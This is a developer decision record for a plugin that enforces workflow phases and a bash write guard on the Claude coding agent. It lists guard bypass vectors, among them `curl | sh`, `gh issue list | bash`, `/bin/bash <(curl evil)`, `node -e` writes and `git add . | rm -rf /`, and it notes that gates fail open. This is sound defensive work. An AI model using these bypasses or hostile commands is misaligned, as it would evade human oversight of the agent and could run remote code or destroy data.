# Decision Record: Guard Hardening, State Resilience & Step Enforcement

## Problem

Four open issues from the v1.9.0 session need resolution:

1. **#4408 — Bash write guard bypass vectors (Medium/Security):** The write guard has gaps — pipe `|` not split in git chain parser, `curl|bash` undetected, `node -e`/`ruby -e`/`perl -e` file writes undetected. These are defense-in-depth gaps in a "speed bump, not a wall" guard.

2. **#4411 — State file resilience (Medium/Robustness):** Race condition in `_safe_write` uses `$$` which collides in subshells. Corrupt state file returns `"off"` phase, silently disabling all enforcement (fail-open).

3. **#4412 — Within-phase step enforcement (High/Feature):** Nothing prevents Claude from skipping or reordering steps within a phase. Caused user frustration twice in v1.9.0 when COMPLETE Steps 7-8 were skipped.

4. **#4416 — Auto-categorized tech debt to GitHub issues (High/Feature):** COMPLETE pipeline Step 7 produces flat findings. Need auto-categorization into groups, one claude-mem observation per category, and one GitHub issue per category with statusline linking.

### Measurable Outcomes

1. Bash write guard blocks `echo test | bash`, `curl URL | sh`, `node -e "require('fs').writeFileSync(...)"` in define/discuss/complete phases
2. Pipe `|` in git chain detection splits correctly — `git add . | rm -rf /` is blocked
3. Corrupt `workflow.json` returns `"error"` phase (not `"off"`), blocking writes until user resets
4. `_safe_write` race condition eliminated — concurrent calls don't collide on temp filenames
5. COMPLETE phase coaching fires when Claude attempts `git commit` before `results_presented` milestone
6. DISCUSS phase has milestones (`problem_confirmed`, `research_done`, `approach_selected`, `plan_written`)
7. Step 7 groups findings into categories (Security, Robustness, Feature, Tech Debt, Documentation)
8. One claude-mem observation saved per non-empty category
9. One GitHub issue created per category (autonomy-aware gating)
10. `gh` commands allowed in COMPLETE phase; `rm` allowed only for `.claude/tmp/`

## Approaches Considered (DISCUSS phase — diverge)

### Approach A: Coaching-Only Step Enforcement
- Step counter integer per phase, coaching fires if counter is behind
- **Pros:** Minimal state changes (~5 lines). No gates.
- **Cons:** No persistence. Claude can ignore coaching AND skip the counter increment. Weakest enforcement.

### Approach B: Soft Milestone Step Enforcement (Selected)
- Per-phase step milestones reusing existing exit gate infrastructure. Coaching fires when later-step tool patterns detected before earlier milestone is set.
- **Pros:** Persistent state. Reuses existing `_reset_section`/`_check_milestones` API. Consistent with exit gates. Self-correcting (coaching tells Claude which milestone to mark).
- **Cons:** More state (~4 new DISCUSS milestones). Detection heuristics are approximate. Possible false positives.

### Approach C: Hard Gate Step Enforcement
- Same as B but tool calls blocked if prior milestone not set.
- **Pros:** Strongest guarantee.
- **Cons:** Too rigid for parallel steps. Risk of locking users out. Contradicts "speed bump" philosophy.

## Decision (DISCUSS phase — converge)

- **Chosen approach:** Approach B — Soft Milestone Step Enforcement
- **Rationale:** Extends existing infrastructure, provides persistent tracking, coaching matches project philosophy. The v1.9.0 problem was absence of enforcement, not Claude deliberately bypassing it — coaching would have caught it.
- **Trade-offs accepted:**
  - Detection heuristics may produce false positives (cost: annoying coaching message, self-corrects)
  - Claude can theoretically ignore coaching (cost: same as v1.9.0, but now visible)
  - More state fields to manage (cost: maintenance overhead, mitigated by reusing existing API)
  - `rm .claude/tmp/` exception is coarse (cost: could delete all temp files, acceptable since it's a temp dir)
  - Category grouping means mixed effort/priority per GitHub issue (cost: less granular tracking)
- **Risks identified:**
  - False positive coaching could train Claude to ignore coaching messages (mitigation: keep messages specific and actionable)
  - Corrupt state fail-closed could surprise users (mitigation: immediate coaching message with reset instructions)
- **Constraints applied:**
  - Must fire in all autonomy modes (user decision)
  - Categorization in complete.md, not a separate agent (token efficiency)
  - Bypass fixes limited to Option B scope (pipe-to-shell + runtime detection, not xargs/chmod)
- **Tech debt acknowledged:**
  - Low-severity bypass vectors (`xargs rm`, `chmod`/`mkdir`) left open
  - DEFINE phase has no step milestones (simplest phase, not worth the overhead)
  - No hard gates on within-phase steps (deliberate — could be added later if coaching proves insufficient)

## Review Findings (REVIEW phase)

### Critical
- [SEC] `gh issue list | bash` bypasses all guards in COMPLETE — gh exception exits early before PIPE_SHELL check. Fix: add `! echo "$COMMAND" | grep -qE "$PIPE_SHELL"` to gh exception guard. `bash-write-guard.sh:189-192`.
- [ARCH] Hard gate bypass when `reset_*_status()` never called — `_check_milestones` returns empty (no missing) when section doesn't exist, so gate always passes. Affects DISCUSS, IMPLEMENT, COMPLETE gates. Fix: `_check_milestones` should fail-closed when section absent. `workflow-state.sh:645`.

### Warnings (fixed)
- [QUAL] `gh` chain guard blocked legitimate pipes (`gh issue list | jq`). Fixed: removed `|` from gh chain guard, kept `&&`/`||`/`;`.
- [QUAL] Pipe split over-splits safe git chains. Accepted: fails closed (denies rather than allows), low priority.
- [ARCH] Plan references `plugin/version.txt` which doesn't exist. Accepted: plan template error, version bumped correctly in both JSON files.

### Suggestions (accepted as tech debt)
- [QUAL] DRY opportunity: 4 runtime write detection blocks share identical structure. Could extract helper function.
- [QUAL] Extract `is_write_tool()` helper in post-tool-navigator for repeated Write/Edit/MultiEdit checks.
- [HYG] Test file is 2750+ lines — consider splitting into per-component test files.
- [HYG] Legacy numeric autonomy mapping (1/2/3 → off/ask/auto) is dead code but harmless.
- [GOV] Docs don't carry license headers (matches existing convention).
- [ARCH] Negative test assertions use non-exact message fragments (fragile but passing).

## Outcome Verification (COMPLETE phase)
- [x] Outcome 1: Bash guard blocks `echo test | bash`, `curl | sh`, `node -e writeFileSync` — PASS — 10 tests in run-tests.sh:1237-1284
- [x] Outcome 2: Pipe `|` in git chain splits correctly — PASS — test at run-tests.sh:1228
- [x] Outcome 3: Corrupt state returns `"error"` phase — PASS — 3 tests (corrupt JSON, empty, unknown phase)
- [x] Outcome 4: `_safe_write` race condition eliminated — PASS — mktemp + 10-concurrent-write test
- [x] Outcome 5: COMPLETE coaching fires on git commit before results_presented — PASS — test at run-tests.sh:1840
- [x] Outcome 6: DISCUSS phase has 4 milestones — PASS — 7 tests for API + exit gate
- [x] Outcome 7: Step 7 groups findings into 5 categories — PASS — complete.md:338-346
- [x] Outcome 8: One observation per non-empty category — PASS — complete.md:362-373
- [x] Outcome 9: One GitHub issue per category with autonomy gating — PASS — complete.md:375-391
- [x] Outcome 10: `gh` allowed in COMPLETE, `rm` only for `.claude/tmp/` — PASS — 9 tests
- **Plan deliverables:** 77/77 PASS, 2 N/A
- **Boundary tests:** 95/95 PASS
- **Devil's advocate:** 2 CRITICAL, 4 HIGH, 5 MEDIUM, 2 LOW (see open issues below)

## Open Issues (discovered during COMPLETE phase)

### Critical bugs (fix in next session)
1. **`gh | bash` bypass in COMPLETE** — gh exception allows pipe-to-shell. `bash-write-guard.sh:189-192`. Fix: add PIPE_SHELL check to gh exception.
2. **Hard gate bypass when section not initialized** — `_check_milestones` returns empty when `_section_exists` is false. All 3 phase gates (DISCUSS, IMPLEMENT, COMPLETE) affected. `workflow-state.sh:645`. Fix: fail-closed when section absent.

### High severity (devil's advocate findings)
3. **Pipe-to-shell via `env`/absolute path** — `curl | env bash`, `curl | /bin/bash` bypass PIPE_SHELL. Pattern only matches bare shell names.
4. **Process substitution bypass** — `/bin/bash <(curl evil)` and `. <(curl evil)` not caught by any pattern.

### Medium severity
5. **Script file execution bypass** — `python3 /tmp/evil.py`, `node /tmp/evil.js` pass because runtime detection only checks inline eval flags.
6. **GH_OPS false positives** — `echo "gh ..."`, `grep "gh "`, `gh pr view` (read-only) blocked in DEFINE/DISCUSS. Pattern matches anywhere in command, not just as leading token.
7. **`gh api -X DELETE` unrestricted** — destructive API ops allowed in COMPLETE with no subcommand filtering.

### Structural issues (discovered during pipeline)
8. **Skill tool bypasses `!` backtick execution** (#4470) — commands invoked via Skill tool don't get platform `!` preprocessing. Caused missed phase transition.
9. **Background agents corrupt live state** (#4471) — boundary tester/devil's advocate wrote to live workflow.json. Fix: use `isolation: "worktree"` for destructive test agents.
10. **Remove COMPLETE→IMPLEMENT loop-back** — COMPLETE should be complete and handover only. If critical bugs are found, they go to open issues for the next session, not back to IMPLEMENT in the same session. The loop-back cycle adds complexity and the completion snapshot mechanism is fragile.
